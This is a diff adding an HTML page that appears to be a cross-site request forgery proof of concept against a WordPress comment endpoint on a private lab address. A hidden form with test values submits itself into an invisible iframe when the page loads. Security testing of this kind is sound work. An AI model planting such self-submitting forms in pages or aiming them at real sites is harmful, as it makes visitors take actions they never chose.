@@ -1,0 +1,17 @@
+<html>
+ <body> 
+  <form action="http://10.10.40.63/wordpress/wp-comments-post.php" method="POST" id="speaker_form" target="form_iframe"> 
+   <input type="hidden" name="comment" value="testtest123" /> 
+   <input type="hidden" name="author" value="test" /> 
+   <input type="hidden" name="email" value="test@test.com" /> 
+   <input type="hidden" name="url" value="test" /> 
+   <input type="hidden" name="comment_post_ID" value="1" /> 
+   <input type="hidden" name="comment_parent" value="0" /> 
+  </form> 
+  
+  <iframe name="form_iframe" style="display:none;"></iframe> 
+  <script>
+  document.getElementById('speaker_form').submit();
+  </script>   
+ </body>
+</html>
